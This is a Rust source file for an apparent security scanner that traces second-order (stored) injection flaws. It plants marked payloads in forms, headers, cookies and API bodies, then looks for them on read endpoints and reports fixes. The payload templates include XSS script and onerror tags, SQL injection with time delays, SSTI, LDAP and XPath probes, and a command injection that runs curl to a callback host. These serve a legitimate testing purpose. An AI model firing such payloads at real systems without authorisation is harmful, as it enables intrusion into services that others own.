use std::collections::HashMap;
use std::fmt;
use std::time::{SystemTime, UNIX_EPOCH};

use serde::{Deserialize, Serialize};

/// Where the malicious payload gets injected (the storage vector).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum InjectionVector {
    FormField,
    HttpHeader,
    Cookie,
    QueryParam,
    JsonBody,
    XmlBody,
    FileUpload,
    ApiEndpoint,
    DatabaseField,
    EmailContent,
}

impl InjectionVector {
    pub fn all() -> &'static [InjectionVector] {
        &[
            Self::FormField,
            Self::HttpHeader,
            Self::Cookie,
            Self::QueryParam,
            Self::JsonBody,
            Self::XmlBody,
            Self::FileUpload,
            Self::ApiEndpoint,
            Self::DatabaseField,
            Self::EmailContent,
        ]
    }
}

impl fmt::Display for InjectionVector {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::FormField => "form_field",
            Self::HttpHeader => "http_header",
            Self::Cookie => "cookie",
            Self::QueryParam => "query_param",
            Self::JsonBody => "json_body",
            Self::XmlBody => "xml_body",
            Self::FileUpload => "file_upload",
            Self::ApiEndpoint => "api_endpoint",
            Self::DatabaseField => "database_field",
            Self::EmailContent => "email_content",
        };
        write!(f, "{label}")
    }
}

/// Where the stored payload gets triggered and rendered (the read vector).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum TriggerVector {
    PageRender,
    EmailSent,
    PdfGeneration,
    LogViewer,
    AdminPanel,
    ApiResponse,
    ReportExport,
    CronJob,
    ScheduledTask,
    WebhookCallback,
}

impl TriggerVector {
    pub fn all() -> &'static [TriggerVector] {
        &[
            Self::PageRender,
            Self::EmailSent,
            Self::PdfGeneration,
            Self::LogViewer,
            Self::AdminPanel,
            Self::ApiResponse,
            Self::ReportExport,
            Self::CronJob,
            Self::ScheduledTask,
            Self::WebhookCallback,
        ]
    }

    /// Whether this trigger fires on a schedule rather than on user request.
    pub fn is_async(&self) -> bool {
        matches!(
            self,
            Self::CronJob | Self::ScheduledTask | Self::WebhookCallback | Self::EmailSent
        )
    }
}

impl fmt::Display for TriggerVector {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::PageRender => "page_render",
            Self::EmailSent => "email_sent",
            Self::PdfGeneration => "pdf_generation",
            Self::LogViewer => "log_viewer",
            Self::AdminPanel => "admin_panel",
            Self::ApiResponse => "api_response",
            Self::ReportExport => "report_export",
            Self::CronJob => "cron_job",
            Self::ScheduledTask => "scheduled_task",
            Self::WebhookCallback => "webhook_callback",
        };
        write!(f, "{label}")
    }
}

/// Severity rating for a confirmed second-order finding.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum Severity {
    Critical,
    High,
    Medium,
    Low,
    Info,
}

impl fmt::Display for Severity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::Critical => "critical",
            Self::High => "high",
            Self::Medium => "medium",
            Self::Low => "low",
            Self::Info => "info",
        };
        write!(f, "{label}")
    }
}

/// Vulnerability class for the second-order chain.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum SecondOrderVulnType {
    StoredXss,
    StoredSqli,
    StoredSsti,
    StoredCommandInjection,
    StoredLdapInjection,
    StoredXpathInjection,
}

impl fmt::Display for SecondOrderVulnType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::StoredXss => "stored_xss",
            Self::StoredSqli => "stored_sqli",
            Self::StoredSsti => "stored_ssti",
            Self::StoredCommandInjection => "stored_cmdi",
            Self::StoredLdapInjection => "stored_ldap_injection",
            Self::StoredXpathInjection => "stored_xpath_injection",
        };
        write!(f, "{label}")
    }
}

/// Unique marker injected into a storage vector so we can correlate it
/// when the payload surfaces in a trigger vector later.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct TracerMarker {
    pub marker_id: String,
    pub payload: String,
    pub injection_vector: InjectionVector,
    pub injected_at_ms: u64,
    pub expected_trigger: TriggerVector,
}

/// Outcome of correlating an injected marker against trigger responses.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct CorrelationResult {
    pub marker_id: String,
    pub injection_vector: InjectionVector,
    pub trigger_vector: TriggerVector,
    pub detection_delay_ms: u64,
    pub confirmed: bool,
    pub evidence: String,
    pub payload_executed: bool,
}

/// A confirmed second-order finding ready for reporting.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct SecondOrderFinding {
    pub injection_point: String,
    pub trigger_point: String,
    pub vulnerability_type: SecondOrderVulnType,
    pub severity: Severity,
    pub marker: TracerMarker,
    pub remediation: String,
}

/// Configuration for polling async trigger vectors (cron, webhooks, etc).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct AsyncTriggerConfig {
    pub poll_interval_ms: u64,
    pub max_wait_ms: u64,
    pub check_endpoints: Vec<String>,
}

impl Default for AsyncTriggerConfig {
    fn default() -> Self {
        Self {
            poll_interval_ms: 2000,
            max_wait_ms: 30_000,
            check_endpoints: Vec::new(),
        }
    }
}

/// Top-level scan configuration for the second-order tracer.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct SecondOrderScanConfig {
    pub injection_vectors: Vec<InjectionVector>,
    pub trigger_vectors: Vec<TriggerVector>,
    pub marker_prefix: String,
    pub enable_async_detection: bool,
    pub async_config: AsyncTriggerConfig,
}

impl Default for SecondOrderScanConfig {
    fn default() -> Self {
        Self {
            injection_vectors: InjectionVector::all().to_vec(),
            trigger_vectors: TriggerVector::all().to_vec(),
            marker_prefix: "AEGIS2ND".to_string(),
            enable_async_detection: true,
            async_config: AsyncTriggerConfig::default(),
        }
    }
}

/// Built HTTP request that carries an injected marker to a storage endpoint.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct InjectionRequest {
    pub url: String,
    pub method: String,
    pub headers: HashMap<String, String>,
    pub body: Option<String>,
    pub marker: TracerMarker,
}

/// Payload template keyed by vulnerability class.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct PayloadTemplate {
    pub vuln_type: SecondOrderVulnType,
    pub template: String,
    pub marker_placeholder: String,
}

/// Summary report for a full second-order scan pass.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct SecondOrderReport {
    pub total_markers_injected: usize,
    pub total_triggers_checked: usize,
    pub confirmed_findings: Vec<SecondOrderFinding>,
    pub unconfirmed_correlations: Vec<CorrelationResult>,
    pub async_detections: usize,
    pub scan_duration_ms: u64,
}

fn now_ms() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_millis() as u64
}

fn random_hex(len: usize) -> String {
    use rand::Rng;
    let mut rng = rand::rng();
    (0..len)
        .map(|_| format!("{:02x}", rng.random::<u8>()))
        .collect()
}

/// Second-Order Injection Tracer v2.
///
/// Injects uniquely-marked payloads into storage vectors, then fires all
/// configured trigger vectors looking for the markers. Supports async
/// trigger detection for cron jobs, scheduled tasks, and webhook callbacks.
#[derive(Debug, Clone)]
pub struct SecondOrderTracerV2 {
    config: SecondOrderScanConfig,
    base_url: String,
    markers: Vec<TracerMarker>,
    correlations: Vec<CorrelationResult>,
    findings: Vec<SecondOrderFinding>,
}

impl SecondOrderTracerV2 {
    /// Create a tracer against `base_url` with the given scan config.
    pub fn new(base_url: &str, config: SecondOrderScanConfig) -> Self {
        Self {
            config,
            base_url: base_url.trim_end_matches('/').to_string(),
            markers: Vec::new(),
            correlations: Vec::new(),
            findings: Vec::new(),
        }
    }

    /// Generate a unique marker for a given injection+trigger pair.
    pub fn generate_marker(
        &self,
        vector: InjectionVector,
        trigger: TriggerVector,
        payload: &str,
    ) -> TracerMarker {
        let hex = random_hex(8);
        let marker_id = format!("{}-{hex}", self.config.marker_prefix);
        TracerMarker {
            marker_id,
            payload: payload.to_string(),
            injection_vector: vector,
            injected_at_ms: now_ms(),
            expected_trigger: trigger,
        }
    }

    /// Return all payload templates, each containing a `{{MARKER}}` placeholder.
    pub fn payload_templates() -> Vec<PayloadTemplate> {
        vec![
            PayloadTemplate {
                vuln_type: SecondOrderVulnType::StoredXss,
                template: "<script>document.location='//cb/{{MARKER}}'</script>".into(),
                marker_placeholder: "{{MARKER}}".into(),
            },
            PayloadTemplate {
                vuln_type: SecondOrderVulnType::StoredXss,
                template: "<img src=x onerror=fetch('//cb/{{MARKER}}')>".into(),
                marker_placeholder: "{{MARKER}}".into(),
            },
            PayloadTemplate {
                vuln_type: SecondOrderVulnType::StoredSqli,
                template: "' OR 1=1; SELECT '{{MARKER}}' --".into(),
                marker_placeholder: "{{MARKER}}".into(),
            },
            PayloadTemplate {
                vuln_type: SecondOrderVulnType::StoredSqli,
                template: "'; WAITFOR DELAY '0:0:5'; SELECT '{{MARKER}}' --".into(),
                marker_placeholder: "{{MARKER}}".into(),
            },
            PayloadTemplate {
                vuln_type: SecondOrderVulnType::StoredSsti,
                template: "{{'{{'}}{{MARKER}}{{'}}'}}".into(),
                marker_placeholder: "{{MARKER}}".into(),
            },
            PayloadTemplate {
                vuln_type: SecondOrderVulnType::StoredSsti,
                template: "${{{MARKER}}}".into(),
                marker_placeholder: "{MARKER}".into(),
            },
            PayloadTemplate {
                vuln_type: SecondOrderVulnType::StoredCommandInjection,
                template: ";echo {{MARKER}}".into(),
                marker_placeholder: "{{MARKER}}".into(),
            },
            PayloadTemplate {
                vuln_type: SecondOrderVulnType::StoredCommandInjection,
                template: "|curl http://cb/{{MARKER}}".into(),
                marker_placeholder: "{{MARKER}}".into(),
            },
            PayloadTemplate {
                vuln_type: SecondOrderVulnType::StoredLdapInjection,
                template: ")(uid={{MARKER}}".into(),
                marker_placeholder: "{{MARKER}}".into(),
            },
            PayloadTemplate {
                vuln_type: SecondOrderVulnType::StoredXpathInjection,
                template: "' or '{{MARKER}}'='{{MARKER}}".into(),
                marker_placeholder: "{{MARKER}}".into(),
            },
        ]
    }

    /// Build injection payloads for every configured vector+trigger pair.
    ///
    /// Returns one `TracerMarker` per (injection_vector, trigger_vector, template).
    pub fn inject_payloads(&mut self) -> Vec<TracerMarker> {
        let templates = Self::payload_templates();
        let mut injected: Vec<TracerMarker> = Vec::new();

        for iv in &self.config.injection_vectors {
            for tv in &self.config.trigger_vectors {
                for tpl in &templates {
                    let rendered = self.render_template(tpl, *iv, *tv);
                    injected.push(rendered);
                }
            }
        }
        self.markers.extend(injected.clone());
        injected
    }

    /// Render a single template into a concrete marker with payload.
    fn render_template(
        &self,
        tpl: &PayloadTemplate,
        iv: InjectionVector,
        tv: TriggerVector,
    ) -> TracerMarker {
        let hex = random_hex(8);
        let marker_id = format!("{}-{hex}", self.config.marker_prefix);
        let payload = tpl.template.replace(&tpl.marker_placeholder, &marker_id);
        TracerMarker {
            marker_id,
            payload,
            injection_vector: iv,
            injected_at_ms: now_ms(),
            expected_trigger: tv,
        }
    }

    /// Build an HTTP request that delivers a marker to its injection vector.
    pub fn build_injection_request(&self, marker: &TracerMarker) -> InjectionRequest {
        let (url, method, headers, body) = match marker.injection_vector {
            InjectionVector::FormField => {
                let url = format!("{}/submit", self.base_url);
                let mut h = HashMap::new();
                h.insert(
                    "Content-Type".into(),
                    "application/x-www-form-urlencoded".into(),
                );
                let body = format!("field={}", marker.payload);
                (url, "POST".into(), h, Some(body))
            }
            InjectionVector::HttpHeader => {
                let url = format!("{}/api/data", self.base_url);
                let mut h = HashMap::new();
                h.insert("X-Custom-Input".into(), marker.payload.clone());
                (url, "GET".into(), h, None)
            }
            InjectionVector::Cookie => {
                let url = format!("{}/dashboard", self.base_url);
                let mut h = HashMap::new();
                h.insert("Cookie".into(), format!("session={}", marker.payload));
                (url, "GET".into(), h, None)
            }
            InjectionVector::QueryParam => {
                let url = format!("{}/search?q={}", self.base_url, marker.payload);
                (url, "GET".into(), HashMap::new(), None)
            }
            InjectionVector::JsonBody => {
                let url = format!("{}/api/create", self.base_url);
                let mut h = HashMap::new();
                h.insert("Content-Type".into(), "application/json".into());
                let body = format!(r#"{{"name":"{}"}}"#, marker.payload);
                (url, "POST".into(), h, Some(body))
            }
            InjectionVector::XmlBody => {
                let url = format!("{}/api/xml", self.base_url);
                let mut h = HashMap::new();
                h.insert("Content-Type".into(), "application/xml".into());
                let body = format!("<data><value>{}</value></data>", marker.payload);
                (url, "POST".into(), h, Some(body))
            }
            InjectionVector::FileUpload => {
                let url = format!("{}/upload", self.base_url);
                let mut h = HashMap::new();
                h.insert("Content-Type".into(), "multipart/form-data".into());
                let body = format!("--boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"payload.txt\"\r\n\r\n{}\r\n--boundary--", marker.payload);
                (url, "POST".into(), h, Some(body))
            }
            InjectionVector::ApiEndpoint => {
                let url = format!("{}/api/resource", self.base_url);
                let mut h = HashMap::new();
                h.insert("Content-Type".into(), "application/json".into());
                let body = format!(r#"{{"payload":"{}"}}"#, marker.payload);
                (url, "PUT".into(), h, Some(body))
            }
            InjectionVector::DatabaseField => {
                let url = format!("{}/api/records", self.base_url);
                let mut h = HashMap::new();
                h.insert("Content-Type".into(), "application/json".into());
                let body = format!(r#"{{"record":"{}"}}"#, marker.payload);
                (url, "POST".into(), h, Some(body))
            }
            InjectionVector::EmailContent => {
                let url = format!("{}/api/contact", self.base_url);
                let mut h = HashMap::new();
                h.insert("Content-Type".into(), "application/json".into());
                let body = format!(r#"{{"message":"{}"}}"#, marker.payload);
                (url, "POST".into(), h, Some(body))
            }
        };

        InjectionRequest {
            url,
            method,
            headers,
            body,
            marker: marker.clone(),
        }
    }

    /// Build the URL we hit to trigger a specific read vector.
    pub fn trigger_url(&self, trigger: TriggerVector) -> String {
        let segment = match trigger {
            TriggerVector::PageRender => "/view",
            TriggerVector::EmailSent => "/api/emails/outbox",
            TriggerVector::PdfGeneration => "/api/reports/pdf",
            TriggerVector::LogViewer => "/admin/logs",
            TriggerVector::AdminPanel => "/admin/dashboard",
            TriggerVector::ApiResponse => "/api/data",
            TriggerVector::ReportExport => "/api/reports/export",
            TriggerVector::CronJob => "/api/cron/status",
            TriggerVector::ScheduledTask => "/api/tasks/results",
            TriggerVector::WebhookCallback => "/api/webhooks/received",
        };
        format!("{}{segment}", self.base_url)
    }

    /// Fire every configured trigger vector and collect raw response bodies.
    ///
    /// In a real scan this would make HTTP requests; here we return the
    /// URLs so the caller's transport layer can fetch them.
    pub fn trigger_read_vectors(&self) -> Vec<(TriggerVector, String)> {
        self.config
            .trigger_vectors
            .iter()
            .map(|tv| (*tv, self.trigger_url(*tv)))
            .collect()
    }

    /// Correlate injected markers against a set of trigger response bodies.
    ///
    /// `responses` maps `(TriggerVector, response_body)`.
    pub fn correlate_markers(
        &mut self,
        responses: &[(TriggerVector, String)],
    ) -> Vec<CorrelationResult> {
        let mut results = Vec::new();
        let scan_time = now_ms();

        for (tv, body) in responses {
            for marker in &self.markers {
                let found = body.contains(&marker.marker_id);
                let executed = self.check_execution_evidence(body, marker);
                let result = CorrelationResult {
                    marker_id: marker.marker_id.clone(),
                    injection_vector: marker.injection_vector,
                    trigger_vector: *tv,
                    detection_delay_ms: scan_time.saturating_sub(marker.injected_at_ms),
                    confirmed: found,
                    evidence: if found {
                        extract_evidence(body, &marker.marker_id)
                    } else {
                        String::new()
                    },
                    payload_executed: executed,
                };
                if found {
                    results.push(result);
                }
            }
        }
        self.correlations.extend(results.clone());
        results
    }

    /// Heuristic: did the marker trigger actual execution (script tag rendered,
    /// error message leaked, template evaluated)?
    fn check_execution_evidence(&self, body: &str, marker: &TracerMarker) -> bool {
        let id = &marker.marker_id;
        let script_exec = body.contains(&format!("<script>document.location='//cb/{id}'</script>"));
        let img_exec = body.contains(&format!("onerror=fetch('//cb/{id}')"));
        let sqli_echo = body.contains(&format!("SELECT '{id}'"));
        let ssti_eval = body.contains(id) && !body.contains("{{");
        let cmd_echo = body.contains(&format!("echo {id}"));
        script_exec || img_exec || sqli_echo || ssti_eval || cmd_echo
    }

    /// Poll async trigger endpoints until markers appear or `max_wait_ms` elapses.
    ///
    /// Returns URLs paired with the poll interval for the caller to schedule.
    pub fn detect_async_triggers(&self) -> Vec<AsyncPollTask> {
        if !self.config.enable_async_detection {
            return Vec::new();
        }

        let async_triggers: Vec<TriggerVector> = self
            .config
            .trigger_vectors
            .iter()
            .copied()
            .filter(|tv| tv.is_async())
            .collect();

        let mut tasks = Vec::new();
        for tv in async_triggers {
            let url = self.trigger_url(tv);
            tasks.push(AsyncPollTask {
                trigger_vector: tv,
                url,
                poll_interval_ms: self.config.async_config.poll_interval_ms,
                max_wait_ms: self.config.async_config.max_wait_ms,
                marker_ids: self.markers.iter().map(|m| m.marker_id.clone()).collect(),
            });
        }
        tasks
    }

    /// Run the full second-order scan pipeline: inject → trigger → correlate → report.
    pub fn scan_second_order(&mut self) -> SecondOrderReport {
        let start = now_ms();
        let injected = self.inject_payloads();
        let trigger_urls = self.trigger_read_vectors();
        let async_tasks = self.detect_async_triggers();

        SecondOrderReport {
            total_markers_injected: injected.len(),
            total_triggers_checked: trigger_urls.len(),
            confirmed_findings: self.findings.clone(),
            unconfirmed_correlations: self.correlations.clone(),
            async_detections: async_tasks.len(),
            scan_duration_ms: now_ms().saturating_sub(start),
        }
    }

    /// Promote confirmed correlations into findings and build a report.
    pub fn generate_report(&mut self) -> SecondOrderReport {
        let start = now_ms();
        let mut findings = Vec::new();

        for corr in &self.correlations {
            if !corr.confirmed {
                continue;
            }
            let vuln_type = infer_vuln_type(&corr.evidence);
            let severity = severity_for_type(vuln_type);
            let marker = self.find_marker(&corr.marker_id);

            findings.push(SecondOrderFinding {
                injection_point: format!("{}", corr.injection_vector),
                trigger_point: format!("{}", corr.trigger_vector),
                vulnerability_type: vuln_type,
                severity,
                marker,
                remediation: remediation_for_type(vuln_type),
            });
        }

        let unconfirmed: Vec<CorrelationResult> = self
            .correlations
            .iter()
            .filter(|c| !c.confirmed)
            .cloned()
            .collect();

        self.findings = findings.clone();

        SecondOrderReport {
            total_markers_injected: self.markers.len(),
            total_triggers_checked: self.config.trigger_vectors.len(),
            confirmed_findings: findings,
            unconfirmed_correlations: unconfirmed,
            async_detections: 0,
            scan_duration_ms: now_ms().saturating_sub(start),
        }
    }

    fn find_marker(&self, marker_id: &str) -> TracerMarker {
        self.markers
            .iter()
            .find(|m| m.marker_id == marker_id)
            .cloned()
            .unwrap_or_else(|| TracerMarker {
                marker_id: marker_id.to_string(),
                payload: String::new(),
                injection_vector: InjectionVector::FormField,
                injected_at_ms: 0,
                expected_trigger: TriggerVector::PageRender,
            })
    }

    /// Read-only access to all injected markers.
    pub fn markers(&self) -> &[TracerMarker] {
        &self.markers
    }

    /// Read-only access to collected correlations.
    pub fn correlations(&self) -> &[CorrelationResult] {
        &self.correlations
    }

    /// Read-only access to confirmed findings.
    pub fn findings(&self) -> &[SecondOrderFinding] {
        &self.findings
    }
}

/// Task descriptor for async polling; handed to the caller's scheduler.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct AsyncPollTask {
    pub trigger_vector: TriggerVector,
    pub url: String,
    pub poll_interval_ms: u64,
    pub max_wait_ms: u64,
    pub marker_ids: Vec<String>,
}

fn extract_evidence(body: &str, marker_id: &str) -> String {
    let needle = marker_id;
    if let Some(pos) = body.find(needle) {
        let start = pos.saturating_sub(40);
        let end = (pos + needle.len() + 40).min(body.len());
        body[start..end].to_string()
    } else {
        String::new()
    }
}

fn infer_vuln_type(evidence: &str) -> SecondOrderVulnType {
    if evidence.contains("<script") || evidence.contains("onerror") {
        SecondOrderVulnType::StoredXss
    } else if evidence.contains("SELECT") || evidence.contains("WAITFOR") {
        SecondOrderVulnType::StoredSqli
    } else if evidence.contains("{{") || evidence.contains("${") {
        SecondOrderVulnType::StoredSsti
    } else if evidence.contains("echo ") || evidence.contains("|curl") {
        SecondOrderVulnType::StoredCommandInjection
    } else if evidence.contains(")(uid=") {
        SecondOrderVulnType::StoredLdapInjection
    } else if evidence.contains("or '") && evidence.contains("'='") {
        SecondOrderVulnType::StoredXpathInjection
    } else {
        SecondOrderVulnType::StoredXss
    }
}

fn severity_for_type(vuln: SecondOrderVulnType) -> Severity {
    match vuln {
        SecondOrderVulnType::StoredCommandInjection => Severity::Critical,
        SecondOrderVulnType::StoredSqli => Severity::Critical,
        SecondOrderVulnType::StoredSsti => Severity::High,
        SecondOrderVulnType::StoredXss => Severity::High,
        SecondOrderVulnType::StoredLdapInjection => Severity::High,
        SecondOrderVulnType::StoredXpathInjection => Severity::Medium,
    }
}

fn remediation_for_type(vuln: SecondOrderVulnType) -> String {
    match vuln {
        SecondOrderVulnType::StoredXss => {
            "Apply context-aware output encoding on all stored user data before rendering.".into()
        }
        SecondOrderVulnType::StoredSqli => {
            "Use parameterized queries for all database operations involving stored user input."
                .into()
        }
        SecondOrderVulnType::StoredSsti => {
            "Sandbox template engines; never pass raw stored data into template expressions.".into()
        }
        SecondOrderVulnType::StoredCommandInjection => {
            "Never interpolate stored data into shell commands; use allow-listed arguments.".into()
        }
        SecondOrderVulnType::StoredLdapInjection => {
            "Escape LDAP special characters in stored data before constructing queries.".into()
        }
        SecondOrderVulnType::StoredXpathInjection => {
            "Use parameterized XPath APIs; escape stored data before XPath evaluation.".into()
        }
    }
}
